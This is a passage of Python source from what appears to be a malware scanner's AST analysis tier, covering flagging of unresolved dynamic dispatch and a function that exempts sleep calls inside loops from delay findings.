                capability=capability,
                line=getattr(node, "lineno", 1),
                column=getattr(node, "col_offset", 0),
                detail=detail,
                command=keep,
                fixed_command=fixed and capability is Capability.SPAWN,
            )
        )

    def _dynamic(self, node: ast.AST, detail: str) -> None:
        """Reflective dispatch whose target could not be resolved.

        This is the point of the tier rather than a gap in it. An attacker who
        goes dynamic to escape the name match is forced to light this up
        instead, and combined with the decode, egress or credential access that
        malware needs anyway it is a combination with almost no benign
        analogue.
        """
        self._hits.append(
            AstHit(
                capability=Capability.DYNAMIC_DISPATCH,
                line=getattr(node, "lineno", 1),
                column=getattr(node, "col_offset", 0),
                detail=detail,
            )
        )


SLEEP_CALLS = frozenset({"time.sleep", "asyncio.sleep", "trio.sleep", "anyio.sleep"})
"""The ways Python waits, as a dotted name."""


def loop_delay_lines(source: str) -> frozenset[int]:
    """Lines where a sleep is inside a loop, and so a schedule rather than a delay.

    `CAP.ANTI.DELAY.001` says in its own comment what this is for: a sleep at the top of
    a loop is a heartbeat, the only way to express that in one regex is a lookbehind over
    a fixed indentation, and a pattern that works at eight spaces and fails at four is
    worse than the finding it removes. "Expressing it properly means asking the AST
    whether the sleep is the first statement of a loop, which is a change to the Python
    tier rather than to a pattern." This is that change.

    `unslothai/unsloth` hangs a thread with `while True: time.sleep(3600)` to keep a
    partial download's handle open, and prints a heartbeat with
    `for _ in range(10000): time.sleep(300)`. vLLM's `_report_continuous_usage` is the
    case the comment names.

    Anywhere in the loop body, not only the first statement: a retry loop that sleeps
    after its attempt is the same shape and the same claim. What stays reported is a
    sleep in straight-line code, which is what a delay before a payload is.

    Returns nothing for source that does not parse, which leaves the pattern's answer
    standing -- the safe direction.
    """
    try:
        tree = ast.parse(source)
    except (SyntaxError, ValueError, RecursionError):
        return frozenset()

    analyzer = PythonAnalyzer()
    analyzer._collect_names(tree)
    lines: set[int] = set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.While | ast.For | ast.AsyncFor):
            continue
        for inner in ast.walk(node):
            if not isinstance(inner, ast.Call):
                continue
            dotted = analyzer._dotted(inner.func)
            if dotted in SLEEP_CALLS or (dotted or "").endswith(".sleep"):
                lines.add(getattr(inner, "lineno", 0))
    return frozenset(lines)


def resolve(source: str) -> Iterator[AstHit]:
    """Capabilities this source resolves to. Convenience over `PythonAnalyzer`."""
    yield from PythonAnalyzer.analyse(source)


__all__ = [
    "PRIMITIVES",
    "SLEEP_CALLS",
    "Assembled",
    "AstHit",
    "PythonAnalyzer",
    "loop_delay_lines",
    "resolve",
]
